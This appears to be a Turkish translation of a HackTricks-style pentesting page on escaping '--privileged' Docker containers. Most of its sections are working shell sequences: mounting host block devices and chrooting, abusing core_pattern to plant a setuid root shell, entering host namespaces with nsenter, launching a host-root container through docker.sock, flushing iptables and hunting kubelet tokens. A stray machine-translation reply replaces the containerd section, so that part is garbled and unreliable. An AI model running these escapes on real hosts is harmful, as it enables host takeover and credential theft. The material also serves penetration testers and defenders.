# `--privileged` Containers'tan Kaçış

{{#include ../../../banners/hacktricks-training.md}}

## Genel Bakış

`--privileged` ile başlatılan bir container, bir veya iki ekstra izne sahip normal bir container ile aynı şey değildir. Uygulamada, `--privileged` normalde workload'u tehlikeli host kaynaklarından uzak tutan varsayılan runtime korumalarının birkaçını kaldırır veya zayıflatır. Tam etki hala runtime ve host'a bağlıdır, ancak Docker için tipik sonuç şudur:

- all capabilities are granted
- the device cgroup restrictions are lifted
- many kernel filesystems stop being mounted read-only
- default masked procfs paths disappear
- seccomp filtering is disabled
- AppArmor confinement is disabled
- SELinux isolation is disabled or replaced with a much broader label

Önemli sonuç şudur: privileged bir container genellikle ince bir kernel exploit'e ihtiyaç duymaz. Birçok durumda doğrudan host devices, host-facing kernel filesystems veya runtime arayüzleriyle etkileşime girip sonra host shell'ine pivot yapabilir.

## `--privileged`'in Otomatik Olarak Değiştirmediği Şeyler

`--privileged` otomatik olarak host PID, network, IPC veya UTS namespaces'lerine katılmaz. privileged bir container yine de özel namespaces'e sahip olabilir. Bu, bazı escape zincirlerinin ekstra bir koşul gerektirdiği anlamına gelir, örneğin:

- a host bind mount
- host PID sharing
- host networking
- visible host devices
- writable proc/sys interfaces

Bu koşullar gerçek yanlış yapılandırmalarda genellikle kolayca sağlanabilir, ancak kavramsal olarak `--privileged`'den ayrı şeylerdir.

## Kaçış Yolları

### 1. Açığa Çıkan cihazlar aracılığıyla Host Diskini Mount Etme

privileged bir container genellikle `/dev` altında çok daha fazla device node görür. Eğer host block device görünüyorsa, en basit kaçış yolu onu mount etmek ve host filesystem'ine `chroot` yapmaktır:
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
Eğer root bölümü belirgin değilse, önce blok düzenini listeleyin:
```bash
fdisk -l 2>/dev/null
blkid 2>/dev/null
debugfs /dev/sda1 2>/dev/null
```
Eğer pratik yol `chroot` yapmak yerine yazılabilir bir host mount'a bir setuid yardımcı yerleştirmekse, her dosya sisteminin setuid bit'ini uygulamadığını unutmayın. Hızlı bir host-tarafı yetenek kontrolü şudur:
```bash
mount | grep -v "nosuid"
```
Bu faydalıdır çünkü `nosuid` dosya sistemleri altındaki yazılabilir yollar, klasik "drop a setuid shell and execute it later" iş akışları için çok daha az ilgi çekicidir.

Burada suistimal edilen zayıflatılmış korumalar şunlardır:

- tam aygıt erişimi
- geniş yetkiler, özellikle `CAP_SYS_ADMIN`

İlgili sayfalar:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

### 2. Host bind mount'ını bağlama veya yeniden kullanma ve `chroot`

Eğer host kök dosya sistemi zaten konteyner içinde bağlanmışsa, veya konteyner privileged olduğu için gerekli bağlamaları oluşturabiliyorsa, bir host shell genellikle sadece bir `chroot` uzaklıktadır:
```bash
mount | grep -E ' /host| /mnt| /rootfs'
ls -la /host 2>/dev/null
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Host root bind mount yoksa ama host storage erişilebiliyorsa, bir tane oluşturun:
```bash
mkdir -p /tmp/host
mount --bind / /tmp/host
chroot /tmp/host /bin/bash 2>/dev/null
```
Bu yol şu zayıflıkları istismar eder:

- zayıflatılmış mount kısıtlamaları
- tam capabilities
- MAC confinement eksikliği

Related pages:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

### 3. Yazılabilir `/proc/sys` veya `/sys`'i Kötüye Kullanma

`--privileged`'in önemli sonuçlarından biri, procfs ve sysfs korumalarının çok daha zayıf hale gelmesidir. Bu, normalde maskelenmiş veya salt-okunur olarak mount edilen host'a bakan kernel arayüzlerini açığa çıkarabilir.

Klasik bir örnek `core_pattern`:
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
Diğer yüksek değerli yollar şunlardır:
```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
Bu yol şu eksiklikleri kötüye kullanır:

- missing masked paths
- missing read-only system paths

İlgili sayfalar:

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

### 4. Use Full Capabilities For Mount- Or Namespace-Based Escape

A privileged container, normal containers'tan genellikle kaldırılan `CAP_SYS_ADMIN`, `CAP_SYS_PTRACE`, `CAP_SYS_MODULE`, `CAP_NET_ADMIN` ve benzeri birçok yeteneğe sahip olur. Bu, başka bir açık yüzey var olduğunda yerel bir foothold'u host escape'e dönüştürmek için sıklıkla yeterlidir.

Basit bir örnek mounting additional filesystems ve namespace entry kullanmaktır:
```bash
capsh --print | grep cap_sys_admin
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "host namespace entry blocked"
```
Eğer host PID de paylaşılıyorsa, adım daha da kısalır:
```bash
ps -ef | head -n 50
nsenter -t 1 -m -u -n -i -p /bin/bash
```
Bu yol şu şeyleri istismar eder:

- varsayılan privileged capability set
- isteğe bağlı host PID paylaşımı

İlgili sayfalar:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

### 5. Runtime Soketleri Üzerinden Kaçış

Privileged container sıklıkla host runtime durumunu veya soketlerini görür hale gelir. Eğer bir Docker, containerd veya CRI-O soketine erişilebiliyorsa, en basit yaklaşım genellikle runtime API'sini kullanarak host erişimine sahip ikinci bir container başlatmaktır:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
docker -H unix:///var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
I don't have the file contents. Please paste the "For containerd:" section (including surrounding markdown/tags) you want translated to Turkish, and I will translate it while preserving all markdown/html syntax and paths/refs.
```bash
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
```
Bu yol şu istismarları kullanır:

- privileged runtime exposure
- host bind mounts created through the runtime itself

İlgili sayfalar:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

### 6. Ağ İzolasyonu Yan Etkilerini Kaldır

`--privileged` tek başına host network namespace'ine katılmaz, ancak konteynerde ayrıca `--network=host` veya diğer host-network erişimi varsa, tüm network yığını değiştirilebilir hale gelir:
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
Bu her zaman doğrudan bir host shell'i sağlamaz, ancak denial of service, trafik yakalama veya yalnızca loopback üzerinden erişilebilen yönetim servislerine erişim gibi sonuçlar doğurabilir.

İlgili sayfalar:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}

### 7. Host Sırlarını ve Çalışma Zamanı Durumunu Okuma

Temiz bir shell kaçışı hemen mümkün olmasa bile, ayrıcalıklı konteynerler genellikle ana makinenin sırlarını, kubelet durumunu, çalışma zamanı meta verilerini ve komşu konteynerlerin dosya sistemlerini okumaya yetecek erişime sahiptir:
```bash
find /var/lib /run /var/run -maxdepth 3 -type f 2>/dev/null | head -n 100
find /var/lib/kubelet -type f -name token 2>/dev/null | head -n 20
find /var/lib/containerd -type f 2>/dev/null | head -n 50
```
Eğer `/var` host-mounted ise veya runtime dizinleri görünür durumdaysa, bu durum host shell elde edilmeden önce bile lateral movement veya cloud/Kubernetes credential theft için yeterli olabilir.

Related pages:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}

## Kontroller

Aşağıdaki komutların amacı, hangi privileged-container escape families'in hemen uygulanabilir olduğunu doğrulamaktır.
```bash
capsh --print                                    # Confirm the expanded capability set
mount | grep -E '/proc|/sys| /host| /mnt'        # Check for dangerous kernel filesystems and host binds
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null   # Check for host block devices
grep Seccomp /proc/self/status                   # Confirm seccomp is disabled
cat /proc/self/attr/current 2>/dev/null          # Check whether AppArmor/SELinux confinement is gone
find / -maxdepth 3 -name '*.sock' 2>/dev/null    # Look for runtime sockets
```
What is interesting here:

- tam yetki seti, özellikle `CAP_SYS_ADMIN`
- yazılabilir proc/sys erişimi
- görünür host cihazları
- seccomp ve MAC confinement eksikliği
- runtime socket'ları veya host root bind mounts

Any one of those may be enough for post-exploitation. Several together usually mean the container is functionally one or two commands away from host compromise.

## İlgili Sayfalar

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/seccomp.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}
